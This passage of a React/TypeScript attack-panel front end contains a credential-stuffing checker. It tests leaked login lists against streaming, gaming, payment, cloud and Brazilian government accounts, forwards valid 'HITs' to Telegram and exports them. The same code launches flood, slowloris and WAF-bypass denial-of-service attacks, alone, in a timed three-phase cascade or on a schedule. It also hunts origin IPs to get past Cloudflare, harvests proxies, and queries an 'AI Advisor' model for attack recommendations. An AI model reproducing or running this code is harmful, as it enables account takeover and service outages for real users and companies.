    iseek:        { label: "iSeek.pro",      icon: "🌐", category: "Finanças",          logoUrl: gf("iseek.pro"),           logoColor: "#6a1b9a", note: "user:pass" },
    // Social / Redes
    instagram:    { label: "Instagram",      icon: "📸", category: "Social",            logoUrl: si("instagram","E4405F"),  logoColor: "#c13584", note: "email:pass" },
    // Streaming
    crunchyroll:  { label: "Crunchyroll",    icon: "🍥", category: "Streaming",         logoUrl: si("crunchyroll","F47521"),logoColor: "#f47521", note: "email:pass" },
    netflix:      { label: "Netflix",        icon: "🎬", category: "Streaming",         logoUrl: si("netflix","E50914"),    logoColor: "#e50914", note: "email:pass" },
    amazon:       { label: "Prime Video",    icon: "📦", category: "Streaming",         logoUrl: gf("primevideo.com"),      logoColor: "#00a8e1", note: "email:pass" },
    hbomax:       { label: "HBO Max",        icon: "👑", category: "Streaming",         logoUrl: si("hbomax","5f2d91"),     logoColor: "#5f2d91", note: "email:pass" },
    disney:       { label: "Disney+",        icon: "🏰", category: "Streaming",         logoUrl: gf("disneyplus.com"),      logoColor: "#0063e5", note: "email:pass" },
    paramount:    { label: "Paramount+",     icon: "⭐", category: "Streaming",         logoUrl: si("paramountplus","1a4cff"), logoColor: "#1a4cff", note: "email:pass" },
    spotify:      { label: "Spotify",        icon: "🎵", category: "Streaming",         logoUrl: si("spotify","1DB954"),    logoColor: "#1db954", note: "user:pass" },
    // Consultas (CPF/dados públicos)
    receita:      { label: "Receita Federal",icon: "🧾", category: "Consultas",         logoUrl: gf("receita.fazenda.gov.br"), logoColor: "#1a237e", note: "cpf:nasc" },
    // VPS / Hosting
    tubehosting:  { label: "Tube Hosting",   icon: "🖥️", category: "VPS / Hosting",     logoColor: "#0d47a1", note: "user:pass" },
    hostinger:    { label: "Hostinger",      icon: "🌐", category: "VPS / Hosting",     logoUrl: si("hostinger","673fd7"),  logoColor: "#673fd7", note: "email:pass" },
    vultr:        { label: "Vultr",          icon: "⚡", category: "VPS / Hosting",     logoUrl: si("vultr","007BFC"),      logoColor: "#007bfc", note: "API Key" },
    digitalocean: { label: "DigitalOcean",   icon: "🌊", category: "VPS / Hosting",     logoUrl: si("digitalocean","0080FF"), logoColor: "#0080ff", note: "API Key" },
    linode:       { label: "Linode/Akamai",  icon: "🟩", category: "VPS / Hosting",     logoUrl: si("akamai","009BDE"),     logoColor: "#02b159", note: "API Key" },
    hetzner:      { label: "Hetzner",        icon: "🔴", category: "VPS / Hosting",     logoUrl: si("hetzner","D50C2D"),    logoColor: "#d50c2d", note: "API Key" },
    // Dev / Cloud
    github:       { label: "GitHub",         icon: "🐙", category: "Dev / Cloud",       logoUrl: si("github","ffffff"),     logoColor: "#24292e", note: "user:PAT" },
    aws:          { label: "AWS IAM",        icon: "☁️", category: "Dev / Cloud",       logoUrl: gf("aws.amazon.com"),      logoColor: "#ff9900", note: "key:secret" },
    // Financeiro BR
    mercadopago:  { label: "Mercado Pago",   icon: "💳", category: "Financeiro BR",     logoUrl: si("mercadopago","009EE3"), logoColor: "#009ee3", note: "email:pass" },
    ifood:        { label: "iFood",          icon: "🍔", category: "Financeiro BR",     logoUrl: si("ifood","EA1D2C"),      logoColor: "#ea1d2c", note: "email:pass" },
    // Financeiro Global
    paypal:       { label: "PayPal",         icon: "🅿️", category: "Financeiro Global", logoUrl: si("paypal","009CDE"),     logoColor: "#003087", note: "email:pass" },
    // Gaming
    riot:         { label: "Riot Games",     icon: "🎮", category: "Gaming",            logoUrl: si("riotgames","D13639"),  logoColor: "#d13639", note: "user:pass" },
    roblox:       { label: "Roblox",         icon: "🟥", category: "Gaming",            logoUrl: si("roblox","E02020"),     logoColor: "#e02020", note: "user:pass" },
    epicgames:    { label: "Epic Games",     icon: "⚫", category: "Gaming",            logoUrl: si("epicgames","ffffff"),   logoColor: "#313131", note: "email:pass" },
    steam:        { label: "Steam",          icon: "🎲", category: "Gaming",            logoUrl: si("steam","C6D4DF"),      logoColor: "#1b2838", note: "user:pass" },
    playstation:  { label: "PlayStation",    icon: "🎮", category: "Gaming",            logoUrl: si("playstation","0070D1"), logoColor: "#003087", note: "email:pass" },
    xbox:         { label: "Xbox",           icon: "🎮", category: "Gaming",            logoUrl: gf("xbox.com"),            logoColor: "#107c10", note: "email:pass" },
  };
  const CRED_CATEGORIES = ["Governo", "Finanças", "Social", "Streaming", "Consultas", "VPS / Hosting", "Dev / Cloud", "Financeiro BR", "Financeiro Global", "Gaming"];

  function handleCredStop() {
    credAbortRef.current?.abort();
    releaseWakeLock();
    // Tell the server to stop the background job (it won't stop on its own when we abort the reader)
    const jid = credJobIdRef.current ?? credJobId;
    if (jid) {
      void fetch(`${BASE}/api/checker/${jid}`, { method: "DELETE" }).catch(() => {});
      credJobIdRef.current = null;
      setCredJobId(null);
      localStorage.removeItem("lb-checker-job-id");
    }
    setCredRunning(false);
  }

  async function handleCredStart() {
    const rawLines = credText.split("\n").map(l => l.trim()).filter(Boolean);
    if (!rawLines.length) { addLog("✕ Cole credenciais no formato login:senha", "error"); return; }

    // ── Deduplicação: filtrar credenciais já testadas para este target ─────
    const checked = loadCheckedCreds(credTarget);
    const lines   = rawLines.filter(l => !checked.has(l));
    const skipped = rawLines.length - lines.length;
    setCredSkipped(skipped);
    if (skipped > 0) addLog(`⏭ ${skipped} credencial(is) ignorada(s) — já testada(s) anteriormente`, "info");

    if (!lines.length) {
      addLog(`✕ Todas as ${rawLines.length} credenciais já foram testadas. Use "Limpar histórico" para repetir.`, "error");
      return;
    }

    setCredRunning(true);
    setCredPaused(false);
    setCredTotal(lines.length);
    setCredDone(0);
    setCredHits([]);
    setCredFailList([]);
    setCredErrorList([]);
    setCredFails(0);
    setCredErrors(0);
    setCredRecent([]);
    setCredTab("hit");

    await acquireWakeLock();

    const sessionChecked = new Set<string>();

    const ac = new AbortController();
    credAbortRef.current = ac;

    try {
      const body: Record<string, unknown> = { credentials: lines, target: credTarget };
      if (webhookUrl.trim()) body.webhookUrl = webhookUrl.trim();
      const activeCredCluster = credUseCluster ? clusterNodes.filter(n => n.trim()) : [];
      if (activeCredCluster.length > 0) body.clusterNodes = activeCredCluster;

      const res = await fetch(`${BASE}/api/checker/stream`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
        signal: ac.signal,
      });

      if (!res.ok || !res.body) {
        addLog(`✕ Checker stream falhou: HTTP ${res.status}`, "error");
        setCredRunning(false);
        return;
      }

      // Save job ID for reconnect after browser close/refresh
      const jid = res.headers.get("X-Checker-Job-Id");
      if (jid) {
        credJobIdRef.current = jid;
        setCredJobId(jid);
        localStorage.setItem("lb-checker-job-id", jid);
      }

      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let buf = "";

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        const parts = buf.split("\n\n");
        buf = parts.pop() ?? "";
        for (const chunk of parts) {
          const dataLine = chunk.split("\n").find(l => l.startsWith("data:"));
          if (!dataLine) continue;
          try {
            // SSE sends FLAT events: { type, credential, login, status, detail, ... }
            const ev = JSON.parse(dataLine.slice(5).trim()) as {
              type: string;
              total?: number;
              credential?: string;
              login?: string;
              status?: "HIT" | "FAIL" | "ERROR";
              detail?: string;
              hits?: number;
              fails?: number;
              errors?: number;
              elapsedMs?: number;
              credsPerMin?: number;
              stopped?: boolean;
            };
            if (ev.type === "start" && ev.total) {
              setCredTotal(ev.total);
            } else if (ev.type === "paused") {
              setCredPaused(true);
              addLog("⏸ Checker pausado", "warn");
            } else if (ev.type === "resumed") {
              setCredPaused(false);
              addLog("▶ Checker retomado", "info");
            } else if (ev.type === "result" && ev.credential) {
              const r: CredResult = {
                credential: ev.credential,
                login:      ev.login ?? "",
                status:     ev.status ?? "ERROR",
                detail:     ev.detail,
              };
              // ── Dedup: mark credential as checked ──────────────────────────
              sessionChecked.add(ev.credential);
              // Persist incrementally every 10 checks to avoid excessive writes
              if (sessionChecked.size % 10 === 0) {
                const updated = loadCheckedCreds(credTarget);
                sessionChecked.forEach(c => updated.add(c));
                saveCheckedCreds(credTarget, updated);
              }
              setCredDone(d => d + 1);
              if (r.status === "HIT") {
                setCredHits(prev => [r, ...prev]);
                setCredTab("hit");
                // Telegram notification
                void sendTelegramHit(r.credential, r.detail, CRED_TARGETS[credTarget]?.label ?? credTarget);
              } else if (r.status === "FAIL") {
                setCredFails(f => f + 1);
                setCredFailList(prev => [r, ...prev]);
              } else {
                setCredErrors(e => e + 1);
                setCredFailList(prev => [r, ...prev]);
              }
              setCredRecent(prev => [r, ...prev].slice(0, 50));
            } else if (ev.type === "done") {
              // Final persist of all session-checked creds
              const finalChecked = loadCheckedCreds(credTarget);
              sessionChecked.forEach(c => finalChecked.add(c));
              saveCheckedCreds(credTarget, finalChecked);
              // Completion log
              const secs = ev.elapsedMs != null ? `${(ev.elapsedMs / 1000).toFixed(1)}s` : "";
              const cpm  = ev.credsPerMin != null ? ` — ${ev.credsPerMin}/min` : "";
              const summary = ev.stopped
                ? `⏹ Checker interrompido — ${ev.hits ?? 0} HITs / ${ev.fails ?? 0} FAILs / ${ev.errors ?? 0} ERRORs${secs ? ` em ${secs}` : ""}${cpm}`
                : `✓ Checker concluído — ${ev.hits ?? 0} HITs / ${ev.fails ?? 0} FAILs / ${ev.errors ?? 0} ERRORs${secs ? ` em ${secs}` : ""}${cpm}`;
              addLog(summary, ev.stopped ? "warn" : "info");
              // Job finished — clear saved job ID
              credJobIdRef.current = null;
              setCredJobId(null);
              localStorage.removeItem("lb-checker-job-id");
              releaseWakeLock();
              setCredRunning(false);
            }
          } catch { /**/ }
        }
      }
      // Stream ended without "done" event — proxy/connection cut, job still running on server
      const orphanJid = credJobIdRef.current;
      if (orphanJid && !ac.signal.aborted) {
        addLog("⚠️ Stream encerrado antes do fim. Reconectando ao job...", "warn");
        console.warn("[checker] stream closed without 'done' event, jobId:", orphanJid);
        await reconnectToCheckerJob(orphanJid);
        return;
      }
    } catch (e) {
      if ((e as Error).name === "AbortError") {
        // User clicked Stop — persist whatever we checked so far (even < 10 threshold)
        const finalChecked = loadCheckedCreds(credTarget);
        sessionChecked.forEach(c => finalChecked.add(c));
        if (sessionChecked.size > 0) saveCheckedCreds(credTarget, finalChecked);
        releaseWakeLock();
      } else {
        // Network drop (screen off, connection lost) — if job exists, reconnect
        const jid = credJobIdRef.current;
        if (jid && !ac.signal.aborted) {
          addLog("⚠️ Conexão perdida. Reconectando ao job...", "warn");
          console.warn("[checker] stream error, reconnecting jobId:", jid, e);
          await reconnectToCheckerJob(jid);
          return;
        }
        addLog(`✕ Checker erro: ${String(e)}`, "error");
        console.error("[checker] fatal error (no jobId to reconnect):", e);
        releaseWakeLock();
      }
    }
    setCredRunning(false);
  }

  async function reconnectToCheckerJob(jobId: string) {
    const ac = new AbortController();
    credAbortRef.current = ac;
    credJobIdRef.current = jobId;
    setCredRunning(true);
    // Reset counters — server will replay all buffered events, rebuilding from scratch
    setCredDone(0); setCredHits([]); setCredFails(0); setCredErrors(0);
    setCredFailList([]); setCredErrorList([]); setCredRecent([]); setCredPaused(false);

    const MAX_RETRIES = 20;
    let attempt      = 0;

    while (attempt < MAX_RETRIES) {
      if (ac.signal.aborted) break;

      // Backoff: 2s, 4s, 8s … capped at 30s
      if (attempt > 0) {
        const delay = Math.min(2_000 * 2 ** (attempt - 1), 30_000);
        addLog(`🔄 Reconectando ao job em ${delay / 1000}s… (tentativa ${attempt}/${MAX_RETRIES})`, "info");
        await new Promise<void>(r => setTimeout(r, delay));
        if (ac.signal.aborted) break;
      }

      let jobDone = false;
      try {
        const res = await fetch(`${BASE}/api/checker/${jobId}/stream`, { signal: ac.signal });
        if (!res.ok || !res.body) {
          // 404 = job expired or not found
          addLog(`✕ Job ${jobId} não encontrado ou expirou`, "error");
          localStorage.removeItem("lb-checker-job-id");
          setCredJobId(null);
          setCredRunning(false);
          return;
        }

        const reader  = res.body.getReader();
        const decoder = new TextDecoder();
        let buf = "";

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          buf += decoder.decode(value, { stream: true });
          const parts = buf.split("\n\n");
          buf = parts.pop() ?? "";
          for (const chunk of parts) {
            const dataLine = chunk.split("\n").find(l => l.startsWith("data:"));
            if (!dataLine) continue;
            try {
              const ev = JSON.parse(dataLine.slice(5).trim()) as { type: string; total?: number; credential?: string; login?: string; status?: "HIT" | "FAIL" | "ERROR"; detail?: string; hits?: number; fails?: number; errors?: number; elapsedMs?: number; credsPerMin?: number; stopped?: boolean };
              if (ev.type === "start" && ev.total) setCredTotal(ev.total);
              else if (ev.type === "result" && ev.credential) {
                const r: CredResult = { credential: ev.credential, login: ev.login ?? "", status: ev.status ?? "ERROR", detail: ev.detail };
                setCredDone(d => d + 1);
                if (r.status === "HIT")  { setCredHits(prev => [r, ...prev]); setCredTab("hit"); }
                else if (r.status === "FAIL")  { setCredFails(f => f + 1); setCredFailList(prev => [r, ...prev]); }
                else { setCredErrors(e => e + 1); setCredErrorList(prev => [r, ...prev]); }
                setCredRecent(prev => [r, ...prev].slice(0, 50));
              } else if (ev.type === "done") {
                jobDone = true;
                const secs2 = ev.elapsedMs != null ? `${(ev.elapsedMs / 1000).toFixed(1)}s` : "";
                const cpm2  = ev.credsPerMin != null ? ` — ${ev.credsPerMin}/min` : "";
                const sum2  = ev.stopped
                  ? `⏹ Checker interrompido — ${ev.hits ?? 0} HITs / ${ev.fails ?? 0} FAILs / ${ev.errors ?? 0} ERRORs${secs2 ? ` em ${secs2}` : ""}${cpm2}`
                  : `✓ Checker concluído — ${ev.hits ?? 0} HITs / ${ev.fails ?? 0} FAILs / ${ev.errors ?? 0} ERRORs${secs2 ? ` em ${secs2}` : ""}${cpm2}`;
                addLog(sum2, ev.stopped ? "warn" : "info");
                credJobIdRef.current = null;
                setCredJobId(null);
                localStorage.removeItem("lb-checker-job-id");
                releaseWakeLock();
                setCredRunning(false);
              }
            } catch { /**/ }
          }
        }
      } catch (e) {
        if ((e as Error).name === "AbortError") break;
        // Network error — will retry in next iteration
      }

      if (jobDone || ac.signal.aborted) break;

      // Stream ended without "done" event — job is still running on server, retry
      attempt++;
    }

    setCredRunning(false);
  }

  // Re-acquire wake lock and reconnect SSE stream when user returns to the tab/app
  useEffect(() => {
    const onVisibilityChange = async () => {
      if (document.visibilityState !== "visible") return;
      const jid = credJobIdRef.current;
      if (!jid) return;
      // Re-acquire wake lock (it's automatically released when screen turns off)
      await acquireWakeLock();
      // If the abort controller is already aborted or missing, the stream is dead — reconnect
      if (!credAbortRef.current || credAbortRef.current.signal.aborted) {
        addLog("🔄 Tela reativada — reconectando ao job...", "info");
        reconnectToCheckerJob(jid);
      }
    };
    document.addEventListener("visibilitychange", onVisibilityChange);
    return () => document.removeEventListener("visibilitychange", onVisibilityChange);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  function handleCredFileUpload(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      const raw = (ev.target?.result as string) ?? "";
      if (credFileLimit > 0) {
        const lines = raw.split("\n");
        const limited = lines.slice(0, credFileLimit);
        setCredText(limited.join("\n"));
        if (lines.length > credFileLimit) {
          addLog(`📂 Arquivo lido: ${lines.length.toLocaleString("pt-BR")} linhas → limitado a ${credFileLimit.toLocaleString("pt-BR")} linhas`, "warn");
        }
      } else {
        setCredText(raw);
      }
    };
    reader.readAsText(file);
    e.target.value = "";
  }

  function exportCredHits() {
    const label = CRED_TARGETS[credTarget]?.label ?? credTarget;
    const header = `# HITs — ${label} — ${new Date().toLocaleString("pt-BR")}\n# Formato: credencial | detalhes\n\n`;
    const text = credHits.map(h => `${h.credential}${h.detail ? ` | ${h.detail}` : ""}`).join("\n");
    const blob = new Blob([header + text], { type: "text/plain" });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement("a");
    a.href     = url;
    a.download = `hits_${credTarget}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  }

  async function handleBenchmark() {
    addLog("👁 Benchmark mode: testing http-flood against httpbin.org (10s)...", "info");
    const testUrl = "http://httpbin.org";
    try {
      const res = await fetch(`${BASE}/api/attacks`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: testUrl, port: 80, method: "http-flood", duration: 10, threads: 100 }),
      });
      const data = await res.json();
      addLog(`👁 Benchmark started [ID #${data.id}] — 100 threads × 10s vs httpbin.org`, "success");
      setTimeout(async () => {
        try {
          const r2 = await fetch(`${BASE}/api/attacks/${data.id}`);
          const d2 = await r2.json();
          const pps = Math.round((d2.packetsSent ?? 0) / 10);
          const mbps = ((d2.bytesSent ?? 0) * 8 / 10 / 1e6).toFixed(1);
          addLog(`👁 Benchmark result: ${fmtNum(d2.packetsSent ?? 0)} total reqs | ${fmtNum(pps)} req/s | ${mbps} Mbps`, "success");
        } catch { /**/ }
      }, 12000);
    } catch { addLog("✕ Benchmark failed.", "error"); }
  }

  /* ── Auto-Recon: analyze target then auto-configure and launch ── */
  async function handleAutoRecon() {
    const urlToAnalyze = target.trim();
    if (!urlToAnalyze) { addLog("✕ Enter a target URL first for Auto-Recon.", "error"); return; }
    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Auto-Recon.", "error"); return; }
    setIsAutoRecon(true); setIsAnalyzing(true); setShowAnalyze(true); setAnalyzeResult(null);
    addLog(`👁 AUTO-RECON: Intelligence scan on ${urlToAnalyze}...`, "info");
    try {
      const res = await fetch(`${BASE}/api/analyze`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToAnalyze }),
      });
      const data: AnalyzeResult = await res.json();
      setAnalyzeResult(data);
      const best = data.recommendations[0];
      if (best) {
        setMethod(best.method);
        setThreads(best.suggestedThreads);
        setDuration(best.suggestedDuration);
        addLog(`👁 AUTO-RECON complete: ${data.recommendations.length} vectors ranked`, "success");
        if (data.serverLabel) addLog(`👁 Server: ${data.serverLabel}${data.isCDN ? ` — CDN: ${data.cdnProvider}` : ""}`, "info");
        addLog(`✅ Best vector: ${best.name} [${best.tier}] — ${best.score}/100 — ${best.reason}`, "success");
        addLog(`👁 Auto-configured: ${best.method.toUpperCase()} × ${best.suggestedThreads}T × ${best.suggestedDuration}s`, "info");
        addLog(`👁 GEASS LAUNCHING IN 2 SECONDS...`, "warn");
        if (soundRef.current) playTone("tick");
        setTimeout(() => { if (!isRunningRef.current) handleLaunch(); }, 2000);
      } else {
        addLog("⚠ No recommendations found — check target accessibility.", "warn");
      }
    } catch { addLog("✕ Auto-recon failed — backend error.", "error"); }
    setIsAnalyzing(false); setIsAutoRecon(false);
  }

  /* ── Cascade Attack: 3-phase sequential assault ── */
  async function handleCascade() {
    const tgt = target.trim();
    if (!tgt) { addLog("✕ Enter a target first for Cascade Attack.", "error"); return; }
    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Cascade.", "error"); return; }
    setIsCascading(true);
    const isHttpsTarget = /^https:/i.test(tgt);
    const tgtPort = isHttpsTarget ? 443 : 80;
    const phase1Dur = Math.max(20, Math.round(duration * 0.35));
    const phase2Dur = Math.max(15, Math.round(duration * 0.35));
    const phase3Dur = Math.max(10, duration - phase1Dur - phase2Dur);

    addLog(`👁 CASCADE PROTOCOL initiated — 3-phase assault on ${tgt}`, "info");
    addLog(`  Phase 1 (${phase1Dur}s): TLS Connection Flood — exhaust connection table`, "info");
    addLog(`  Phase 2 (${phase2Dur}s): Slowloris — hold half-open connections`, "info");
    addLog(`  Phase 3 (${phase3Dur}s): WAF Bypass — precision HTTP strike`, "info");

    if (soundRef.current) playTone("start");
    if ("vibrate" in navigator) navigator.vibrate([200, 100, 200]);

    // Phase 1: Connection Flood — immediately
    setCascadePhase(1);
    addLog(`🔴 Phase 1 ACTIVE — TLS Conn Flood launching...`, "warn");
    try {
      const r1 = await fetch(`${BASE}/api/attacks`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: tgt, port: tgtPort, method: "conn-flood", duration: phase1Dur + phase2Dur + phase3Dur, threads }),
      });
      const a1 = await r1.json() as { id: number };
      setCurrentAttackId(a1.id); setIsRunning(true); isRunningRef.current = true;
      targetRef.current = tgt; startTimeRef.current = Date.now(); durationRef.current = duration;
      currentPacketsRef.current = 0; lastPacketsRef.current = 0; peakPpsRef.current = 0;
      addLog(`👁 Phase 1 online [ID #${a1.id}]`, "success");
      saveFavorite(tgt);

      // Phase 2: Slowloris — starts after phase1
      setTimeout(async () => {
        if (!isRunningRef.current) return;
        setCascadePhase(2);
        addLog(`🔴 Phase 2 ACTIVE — Slowloris holding connections...`, "warn");
        try {
          const r2 = await fetch(`${BASE}/api/attacks`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target: tgt, port: tgtPort, method: "slowloris", duration: phase2Dur + phase3Dur, threads }),
          });
          const a2 = await r2.json() as { id: number };
          addLog(`👁 Phase 2 online [ID #${a2.id}]`, "success");
        } catch { addLog("✕ Phase 2 launch failed.", "error"); }

        // Phase 3: WAF Bypass — starts after phase1+phase2
        setTimeout(async () => {
          if (!isRunningRef.current) return;
          setCascadePhase(3);
          addLog(`🔴 Phase 3 ACTIVE — WAF Bypass precision strike...`, "warn");
          if (soundRef.current) playTone("start");
          try {
            const r3 = await fetch(`${BASE}/api/attacks`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ target: tgt, port: tgtPort, method: "waf-bypass", duration: phase3Dur, threads }),
            });
            const a3 = await r3.json() as { id: number };
            addLog(`👁 Phase 3 online [ID #${a3.id}]`, "success");
          } catch { addLog("✕ Phase 3 launch failed.", "error"); }

          // Cleanup after all phases complete
          setTimeout(() => {
            setCascadePhase(0); setIsCascading(false);
            setIsRunning(false); isRunningRef.current = false;
            setProgress(0); setCurrentAttackId(null); setPps(0); setBps(0); setActiveConns(0);
            addLog(`✅ CASCADE PROTOCOL COMPLETE — all 3 phases executed`, "success");
            addToast("geass", "CASCADE COMPLETE", `3 phases on ${getDomainKey(tgt)}`);
            refetchStats(); refetchHistory();
          }, phase3Dur * 1000 + 2000);
        }, phase2Dur * 1000);
      }, phase1Dur * 1000);

    } catch {
      addLog("✕ Cascade Phase 1 launch failed.", "error");
      setIsCascading(false); setCascadePhase(0);
    }
  }

  async function handleFindOrigin() {
    if (isFindingOrigin) return;
    const rawTarget = target.trim() || "";
    if (!rawTarget) { addLog("✕ Enter a target domain to find origin IP.", "error"); return; }
    const domain = rawTarget.replace(/^https?:\/\//i,"").replace(/\/.*$/,"").trim();
    setIsFindingOrigin(true);
    setShowOriginFinder(true);
    setOriginResult(null);
    addLog(`🔍 Hunting origin IP for ${domain} — crt.sh · DNS · IPv6 · MX · SPF · subdomains...`, "info");
    try {
      const res = await fetch(`${BASE}/api/find-origin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ domain }),
      });
      const data = await res.json() as OriginResult;
      setOriginResult(data);
      if (data.originIPs.length > 0) {
        addLog(`🎯 Origin found! ${data.originIPs.join(", ")} — attack directly to bypass Cloudflare!`, "success");
        addLog(`👁 Checked ${data.crtHostsFound} SSL cert history entries from crt.sh`, "info");
      } else if (data.isCloudflare) {
        addLog(`⚠ Target is Cloudflare-protected and origin IP is hidden. Check SecurityTrails.com manually.`, "warn");
      } else {
        addLog(`👁 No CDN detected — target is directly accessible at its DNS IP.`, "info");
      }
    } catch {
      addLog("✕ Origin finder failed — check backend connection.", "error");
    } finally {
      setIsFindingOrigin(false);
    }
  }

  async function handleFetchProxies() {
    if (proxyFetching) return;
    setProxyFetching(true);
    addLog("👁 Fetching live proxies from 5 public sources — testing connectivity...", "info");
    try {
      await fetch(`${BASE}/api/proxies/refresh`, { method: "POST" });
      // Poll until fetch completes (backend does it async after responding)
      let attempts = 0;
      const poll = setInterval(async () => {
        try {
          const r = await fetch(`${BASE}/api/proxies/count`);
          const d = await r.json() as { count: number; fetching: boolean };
          if (!d.fetching) {
            clearInterval(poll);
            // Load final list
            const r2 = await fetch(`${BASE}/api/proxies`);
            const d2 = await r2.json() as { count: number; publicCount?: number; residentialCount?: number; proxies: ProxyEntry[]; residential?: ResidentialInfo | null };
            setProxies(d2.proxies ?? []);
            if (d2.residential) setResidentialInfo(d2.residential);
            if ((d2.residentialCount ?? 0) > 0) setResidentialCount(d2.residentialCount ?? 0);
            const totalMsg = d2.residentialCount ? ` + ${d2.residentialCount} residential` : "";
            addLog(`👁 Proxy scan complete — ${d2.publicCount ?? d2.count} public${totalMsg} live proxies`, d2.count > 0 ? "success" : "warn");
            if (d2.proxies[0]) addLog(`👁 Fastest: ${d2.proxies[0].host}:${d2.proxies[0].port} (${d2.proxies[0].responseMs}ms)`, "info");
            setProxyFetching(false);
          }
        } catch { /**/ }
        if (++attempts > 40) { clearInterval(poll); setProxyFetching(false); }
      }, 3000);
    } catch {
      addLog("✕ Proxy fetch failed — check backend connection.", "error");
      setProxyFetching(false);
    }
  }

  /* ── Schedule attack ── */
  async function handleSchedule() {
    if (!target.trim()) { addLog("✕ Set a target before scheduling.", "error"); return; }
    if (!scheduleTime)  { addLog("✕ Pick a date/time for the scheduled attack.", "error"); return; }
    const fireDate = new Date(scheduleTime);
    if (fireDate <= new Date()) { addLog("✕ Scheduled time must be in the future.", "error"); return; }
    // Derive port from target URL (same logic as handleLaunch)
    const isHttps = target.trim().startsWith("https://");
    let schedPort = isHttps ? 443 : 80;
    try { const u = new URL(target.trim()); schedPort = parseInt(u.port, 10) || schedPort; } catch { /**/ }
    setScheduleLoading(true);
    try {
      const r = await fetch(`${BASE}/api/attacks/schedule`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target: target.trim(),
          port: schedPort,
          method,
          duration,
          threads,
          scheduledFor: fireDate.toISOString(), // backend accepts ISO or epoch
        }),
      });
      const d = await r.json() as { id?: string; error?: string };
      if (d.error) throw new Error(d.error);
      addLog(`⏰ Attack scheduled [ID ${d.id}] for ${fireDate.toLocaleString()} — ${method.toUpperCase()} → ${target.trim()}`, "success");
      addToast("launch", "Attack Scheduled", `${method.toUpperCase()} fires at ${fireDate.toLocaleTimeString()}`);
      await loadScheduled();
    } catch (e: unknown) {
      addLog(`✕ Scheduling failed: ${e instanceof Error ? e.message : String(e)}`, "error");
    } finally {
      setScheduleLoading(false);
    }
  }

  async function loadScheduled() {
    try {
      const r = await fetch(`${BASE}/api/attacks/scheduled`);
      // Backend returns array directly (no wrapper object)
      const d = await r.json() as Array<{ id: string; target: string; scheduledFor: number; method: string; status?: string }>;
      const mapped = (Array.isArray(d) ? d : []).map(s => ({
        id: s.id,
        target: s.target,
        scheduledAt: new Date(s.scheduledFor).toISOString(),
        method: s.method,
        status: s.status ?? "pending",
      }));
      setScheduledList(mapped);
    } catch { /**/ }
  }

  async function cancelScheduled(id: string) {
    try {
      await fetch(`${BASE}/api/attacks/scheduled/${id}`, { method: "DELETE" });
      setScheduledList(prev => prev.filter(s => s.id !== id));
      addLog(`✕ Scheduled attack ${id} cancelled.`, "warn");
    } catch { /**/ }
  }

  /* ── AI Advisor ── */
  async function handleAiAdvisor() {
    if (!target.trim()) { addLog("✕ Set a target to get AI attack recommendations.", "error"); return; }
    setAiLoading(true); setShowAiModal(true); setAiData(null); setAiError(null);
    addLog("👁 Consulting Lelouch AI Advisor (Groq llama-3.3-70b)… probing target…", "info");
    try {
      const url = (currentAttackId !== null && currentAttackId > 0)
        ? `${BASE}/api/attacks/${currentAttackId}/ai-advisor`
        : `${BASE}/api/advisor?target=${encodeURIComponent(target.trim())}`;
      const r = await fetch(url);
      const d = await r.json() as Record<string, unknown>;
      if (d.error) throw new Error(String(d.error));
      setAiData(d);
      const sev = d.severity ? String(d.severity).toUpperCase() : "";
      const eff = d.effectiveness != null ? ` · ${d.effectiveness}% effectiveness` : "";
      addLog(`👁 AI Advisor: ${sev}${eff} — boost: ${d.boostVector ?? "—"}`, "success");
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setAiError(msg);
      addLog(`✕ AI Advisor error: ${msg}`, "error");
    } finally {
      setAiLoading(false);
    }
  }

  /* ── Derived values ── */
  const pw = powerLevel(threads, method);
  const mi = methodInfo(method);
  const localPkts  = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
  const localBytes = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;
  const totalPackets = localPkts  + (isRunning ? clusterTotalPkts  : 0);
  const totalBytes   = localBytes + (isRunning ? clusterTotalBytes : 0);
  const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1;
  const proxyUsable  = proxyEnabled && (proxies.length > 0 || residentialInfo !== null) && L7_PROXY_OK.has(method);

  // Intensity for GeassEye animation (0–1 based on pps relative to a high reference)
  const eyeIntensity = isRunning ? Math.min(1, pps / 50000) : 0;
  const sparklineColor = method === "geass-override" ? "#C0392B"
    : method === "waf-bypass"  ? "#8E44AD"
    : method === "http2-flood" ? "#1abc9c"
    : method === "slowloris"   ? "#9b59b6"
    : method === "conn-flood"  ? "#e74c3c"
    : L7_HTTP_FE.has(method)   ? "#2ecc71"
    : L4_TCP_FE.has(method)    ? "#3498db"
    : L4_UDP_FE.has(method)    ? "#e67e22"
    : "#D4AF37";
  const isUDP = L4_UDP_FE.has(method);

  /* ── JSX ── */
  /* ── Domain scores sorted by last seen ── */
  const topDomains = Object.entries(domainScores)
    .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
    .slice(0, 5);

  return (
    <div className={`lb-page ${entered ? "lb-entered" : ""} ${isRunning && method === "geass-override" ? "lb-page--geass-active" : ""}`}>
      <GeassEye intensity={eyeIntensity} />
      {geassFlash && <div className="lb-geass-flash" aria-hidden="true" />}
